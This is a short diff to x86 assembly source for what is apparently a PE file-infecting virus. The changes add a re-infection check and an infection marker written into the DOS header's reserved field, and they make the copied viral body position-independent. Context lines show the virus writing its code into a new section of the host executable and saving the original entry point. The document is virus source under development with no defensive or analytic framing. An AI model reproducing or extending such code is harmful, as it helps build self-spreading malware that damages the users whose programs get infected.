@@ -28,12 +28,19 @@ LOCAL	sectionalignment:DWORD
 LOCAL	pointertorawdata:DWORD
 LOCAL	oldentrypoint:DWORD
 
+; TODO: update BaseOfCode
+
 	pushad
 
 	mov		esi, fileptr				; esi -> IMAGE_DOS_HEADER
-	
+
 	cmp		WORD ptr [esi], "ZM"		;
 	jne		infect_err					; Check DOS signature
+
+	mov		ecx, 042h
+	cmp		[esi + 034h], ecx
+	je		infect_err					; Check if file already infected. Infection marker at IMAGE_DOS_HEADER + 0x34 (e_res2[8])
+	mov		[esi + 034h], ecx			; mark file as infected.
 
 	add		esi, [esi + 03ch]			; esi -> IMAGE_NT_HEADERS
 
@@ -178,7 +185,8 @@ LOCAL	oldentrypoint:DWORD
 	add		edi, pointertorawdata
 	push	esi
 	mov		esi, begin_copy
-	mov		edx, end_copy - begin_copy
+	add		esi, ebx					; This is to be position independent
+	mov		edx, end_copy - begin_copy	; TODO: This is not ImageBase or position independent
 	call	my_memcpy
 	pop		esi							; Wrote new section to infected file.
 
@@ -189,8 +197,6 @@ LOCAL	oldentrypoint:DWORD
 	mov		edx, oldentrypoint
 	add		edx, imagebase
 	mov		[ecx], edx					; Wrote oldentrypoint to new section.
-
-	; TODO: mark file as infected, check if infected.
 
 	popad
 
